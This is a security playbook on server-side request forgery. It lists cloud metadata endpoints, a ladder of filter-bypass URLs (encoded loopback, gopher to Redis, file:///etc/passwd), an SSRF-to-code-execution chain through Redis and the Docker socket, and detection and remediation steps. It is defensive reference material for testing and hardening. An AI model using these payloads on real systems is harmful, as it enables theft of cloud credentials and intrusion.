# Playbook - Server-Side Request Forgery

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-SSRF |
| `cwe_id` | CWE-918 |
| `owasp_controls` | INPUT-8, DES-1 |
| `payload_corpus` | `02-payloads/web/ssrf/` |
| `detections` | `06-defense/suricata/rules/ssa-ssrf-metadata.rules` |

## 1. Cloud metadata targets

| Cloud | Endpoint | IMDSv2 required |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | Yes (IMDSv2 token) |
| AWS IMDSv2 token | `http://169.254.169.254/latest/api/token` | `PUT`, header `X-aws-ec2-metadata-token-ttl-seconds` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Header `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Header `Metadata: true` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | - |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | - |

## 2. Bypass ladder

```
http://127.0.0.1/                 -> baseline
http://0/                         -> 0.0.0.0 alias
http://[::1]/                     -> IPv6 loopback
http://2130706433/                -> decimal loopback
http://0x7f.0.0.1/                -> hex loopback
http://0177.0.0.1/                -> octal loopback
http://127.1/                     -> short form
http://localtest.me/              -> resolves to 127.0.0.1 (DNS rebinding friendly)
http://169.254.169.254.nip.io/    -> metadata via hostname
gopher://127.0.0.1:6379/_*...     -> Redis, protocol smuggling
file:///etc/passwd                -> local file read
dict://127.0.0.1:11211/stats      -> memcached
```

## 3. Impact chain

`SSRF -> internal service -> RCE` is the highest-yield chain:
Redis `CONFIG SET dir` + `dbfilename` writes a cron/authorized_keys file;
Docker socket `/var/run/docker.sock` creates a privileged container.

## 4. Detection

* Wazuh rule `86620`: outbound HTTP to link-local metadata from a non-cloud role.
* Suricata `ssa-ssrf-metadata.rules`: `http.host` == `169.254.169.254` or
  `metadata.google.internal`, alert + log payload.
* CloudTrail / GCP audit: `GetInstanceMetadata` calls with unexpected `User-Agent`.

## 5. Remediation

1. Allow-list destinations; resolve DNS and validate the *resolved IP*.
2. Block link-local, loopback and RFC1918 at the egress proxy (OWASP DES-1).
3. Disable IMDSv1; require IMDSv2 with hop limit 1 (AWS) / required headers.
4. Network segmentation between application tier and metadata service.
5. Egress traffic shaping: application servers should not speak to the internet
   at all except through a proxy.
